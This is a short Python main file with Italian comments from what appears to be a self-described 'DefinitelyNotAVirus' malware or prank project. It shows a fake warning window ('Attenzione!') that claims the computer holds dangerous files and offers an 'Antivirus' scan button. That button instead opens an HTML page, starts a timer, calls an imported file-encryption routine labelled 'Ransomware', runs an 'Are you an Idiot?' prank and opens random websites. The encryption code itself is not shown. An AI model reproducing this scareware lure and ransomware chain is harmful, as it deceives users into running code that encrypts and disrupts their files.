# Documento creato il 25/06/2022

import tkinter as tk
import os

from src.RandomWebsite import RandomWebsite
from src.Idiot import Idiot
from src.Timer import Timer
from src.Crypt_n_Decrypt_Files import crypt_and_decrypt_files

# Codice del programma
def DNAV():
    # Apertura automatica di 'DefinetelyNotAVirus.html'
    os.chdir(".\site")
    os.startfile("DefenitelyNotAVIrus.html")

    # Timer di 5 minuti
    Timer()

    # Ransomware
    crypt_and_decrypt_files()

    # Are you an Idiot?
    Idiot()

    # Apertura di siti web a caso
    RandomWebsite() 

# Creazione della finestra di Avvertenza con i rispettivi Widget
window = tk.Tk()
window.geometry("425x200")
window.title("Attenzione!")
window.resizable(False, False)
window.configure(background="#d7d6d7")

l = tk.Label(window, text="Attenzione!", font=("Helvetica 14 bold"), bg="#FFFF00")
l.grid(row=0, column=0)

l1 = tk.Label(window, text="Alcuni file presenti nel tuo computer potrebbero danneggiare il tuo dispositivo!", bg="#d7d6d7")
l1.grid(row=1, column=0)

l2 = tk.Label(window, text="Clicca sul pulsante 'Antivirus' per una scansione approfondita del tuo sistema.", bg="#d7d6d7")
l2.grid(row=3, column=0)

button = tk.Button(window, text="Antivirus", command= DNAV, font=("Helvetica 11 bold"), bg="#B4B4B4")
button.grid(row=5, column=0, pady=50)

# Loop per mantenere la FInestra di Avvertenza aperta
if __name__ == "__main__":
    window.mainloop()



